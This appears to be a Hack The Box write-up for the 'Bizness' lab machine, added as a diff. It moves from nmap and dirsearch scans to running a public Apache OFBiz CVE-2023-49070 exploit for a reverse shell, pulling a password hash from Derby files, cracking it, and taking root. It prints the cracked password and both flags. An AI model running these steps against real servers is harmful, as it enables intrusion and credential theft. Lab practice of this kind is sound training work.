@@ -1,0 +1,201 @@
+
+add to hosts 
+
+10.10.11.252 bizness.htb
+
+nmap enumeration
+
+└──╼ $sudo nmap -sC -sV -T5 10.10.11.252
+[sudo] password for sed: 
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-12 17:16 IST
+Nmap scan report for biznezz.htb (10.10.11.252)
+Host is up (0.058s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
+|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
+|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
+80/tcp   open  http     nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp  open  ssl/http nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+| tls-nextprotoneg: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.18.0
+| tls-alpn: 
+|_  http/1.1
+6969/tcp open  acmsoda?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+lets search dirs
+─[sed@parrot]─[~/sed/htb/bizness]
+└──╼ $dirsearch -u https://bizness.htb
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /home/sed/.dirsearch/reports/bizness.htb/_24-01-12_17-32-51.txt
+
+Error Log: /home/sed/.dirsearch/logs/errors-24-01-12_17-32-51.log
+
+Target: https://bizness.htb/
+
+[17:32:51] Starting: 
+
+[17:33:00] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
+[17:33:06] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
+[17:33:07] 302 -    0B  - /common  ->  https://bizness.htb/common/
+[17:33:07] 404 -  762B  - /common/
+[17:33:07] 404 -  779B  - /common/config/db.ini
+[17:33:07] 404 -  780B  - /common/config/api.ini
+[17:33:08] 302 -    0B  - /content  ->  https://bizness.htb/content/
+[17:33:08] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
+[17:33:08] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
+[17:33:08] 200 -   34KB - /control
+[17:33:09] 200 -   34KB - /control/
+[17:33:09] 404 -  763B  - /default.html
+[17:33:09] 404 -  741B  - /default.jsp
+[17:33:10] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=74B29B5F94401D27C1DF9EF249693FE7.jvm1
+[17:33:10] 404 -  761B  - /error/
+[17:33:10] 302 -    0B  - /example  ->  https://bizness.htb/example/
+[17:33:12] 404 -  762B  - /images/
+[17:33:12] 302 -    0B  - /images  ->  https://bizness.htb/images/
+[17:33:12] 404 -  769B  - /images/c99.php
+[17:33:12] 404 -  768B  - /images/README
+[17:33:12] 404 -  769B  - /images/Sym.php
+[17:33:13] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
+[17:33:13] 200 -   27KB - /index.html
+[17:33:23] 200 -   21B  - /solr/admin/
+[17:33:23] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
+
+Task Completed
+
+
+Found Webapp OFBlz 
+Copyright (c) 2001-2024 The Apache Software Foundation. Powered by Apache OFBiz. Release 18.12
+
+found Exploit 
+https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC.git
+
+usage 
+python3 exploit.py target_url shell ip:port
+
+
+┌─[✗]─[sed@parrot]─[~/htb/bizness]
+└──╼ $python3 ofbiz_exploit.py https://bizness.htb/ shell 10.10.16.33:4444
+The target appears to be vulnerable.
+[?] It is not possible to be certain of success. The target may not be truly vulnerable. [?]
+Check if the reverse shell was established or if there is any command output.
+
+
+got access with 
+nc -lvnp port
+
+└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.33] from (UNKNOWN) [10.10.11.252] 55080
+bash: cannot set terminal process group (737): Inappropriate ioctl for device
+bash: no job control in this shell
+ofbiz@bizness:/opt/ofbiz$ ls
+ls
+APACHE2_HEADER
+
+
+$ whoami    	
+whoami
+ofbiz
+$ cat /home/ofbiz/user.txt
+cat /home/ofbiz/user.txt
+3b087312ecc4a260e05e59c80cb2be2f
+
+found some details
+$ cd /opt/ofbiz/framework/resources/templates/
+cd /opt/ofbiz/framework/resources/templates/
+$ ls
+ls
+AdminNewTenantData-Derby.xml	   index.jsp
+AdminNewTenantData-MySQL.xml	   Menus.xml
+AdminNewTenantData-Oracle.xml	   ofbiz-component.xml
+AdminNewTenantData-PostgreSQL.xml  README.txt
+AdminUserLoginData.xml		   Screens.xml
+build.gradle			   SecurityGroupDemoData.xml
+CommonScreens.xml		   SecurityPermissionSeedData.xml
+controller.xml			   services.xml
+DemoData.xml			   Tests.xml
+document.xml			   TypeData.xml
+entitymodel.xml			   UiLabels.xml
+Forms.xml			   web.xml
+HELP.xml
+$ cat AdminUserLoginData.xml
+
+<entity-engine-xml>
+    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePassw
+ordChange="Y"/>
+    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
+</entity-engine-xml>$ 
+
+finding the salt
+
+
+$ cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0/
+cd /opt/ofbiz/runtime/data/derby/ofbiz/seg0/
+$ ls
+ls
+c10001.dat  c13f41.dat	c41f0.dat  c8151.dat  cc0b1.dat
+c10011.dat  c13f51.dat	c4201.dat  c8161.dat  cc0c1.dat
+c1001.dat   c13f61.dat	c4210.dat  c8171.dat  cc0d1.dat
+
+cat README_DO_NOT_TOUCH_FILES.txt
+
+# *************************************************************************
+# ***              DO NOT TOUCH FILES IN THIS DIRECTORY!                ***
+# *** FILES IN THIS DIRECTORY ARE USED BY THE DERBY DATABASE TO STORE   *** 
+# *** USER AND SYSTEM DATA. EDITING, ADDING, OR DELETING FILES IN THIS  ***
+# *** DIRECTORY WILL CORRUPT THE ASSOCIATED DERBY DATABASE AND MAKE     ***
+# *** IT NON-RECOVERABLE.                                               ***
+# *************************************************************************$
+
+
+
+fbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ grep -arin -o -E  '(\w+\W+){0,5}password(\W+\w+){0,5}' .
+
+
+./c180.dat:87:PASSWORD&$c013800d-00fb-2649-07ec-000000134f30
+./c180.dat:87:SYSCS_MODIFY_PASSWORpasswordVARCHAR
+./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
+./c54d0.dat:21:Password
+
+found hash
+
+decrypt script 
+https://raw.githubusercontent.com/itsWhiteNight/HackingLab/cb60466f4d37c9ab45a2e1c4cf9635dd3b8e34ca/HackTheBox/Machines/Bizness/MyScripts/my_python_script.py
+
+┌─[sed@parrot]─[~/htb/bizness]
+└──╼ $python3 hash.py 
+Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
+^CTraceback (most recent call last):
+
+pwning root
+
+ofbiz@bizness:/opt/ofbiz$ su
+su
+Password: monkeybizness
+
+root@bizness:/opt/ofbiz# cd 
+cd 
+root@bizness:~# cat root.txt
+cat root.txt
+f34845dcb6363aa148407b4245352124
+root@bizness:~# 
+
+
